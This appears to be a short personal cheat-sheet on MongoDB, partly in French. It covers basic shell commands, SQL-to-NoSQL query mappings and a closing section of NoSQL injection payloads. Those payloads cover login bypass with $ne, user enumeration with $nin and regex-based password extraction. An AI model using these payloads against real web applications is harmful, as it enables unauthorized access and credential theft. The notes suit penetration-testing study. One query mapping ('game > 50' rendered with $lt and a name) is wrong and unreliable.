# MongoDB

# Notes

- Hierarchy : database > collection (table) > documents (entries)

# Command lines

Connect
`mongo 1.1.1.1:27017/db`
List databases
`show dbs`
Swith database
`use dbname`
Show collections (tables)
`show collections`
Show collection entries (select from table)
`db.collname.find()`

# NoSQL

- SELECT * FROM collection WHERE last_name = 'Sandler';
`['last_name' => 'Sandler']`
- SELECT * FROM collection WHERE last_name = 'Phillips' AND gender = 'male';
`['last_name' => 'Phillips', 'gender' = 'male']`
- SELECT * FROM collection WHERE game > 50;
`['age' => ['$lt','Sandler']]`

# Operators reference

## Comparison

[Untitled](MongoDB%2099a67101e71a4cdbbb06ef84e2e6b84e/Untitled%20Database%20229f5ec4de924b639aa9f0a68ae6d566.csv)

## Logical

[Untitled](MongoDB%2099a67101e71a4cdbbb06ef84e2e6b84e/Untitled%20Database%20b2fc1ebd95da45199b2d6b76150a60ad.csv)

# NoSQL Injections

## Login bypass

- Random user
Remplacer ?user=username&password=password par :

```
user[$ne]=username&password[$ne]=password

```

- Enumerate users
`user[$nin][]=admin&user[$nin][]=username1&user[$nin][]=username2&password[$ne]=password`
- Guess password length
`user[$nin][]=admin&pass[$regex]=^.{8}$&remember=on`
- Extract password

```
# Fuzz each character with burp
user=admin&pass[$regex]=A.......&remember=on
user=admin&pass[$regex]=AA......&remember=on

```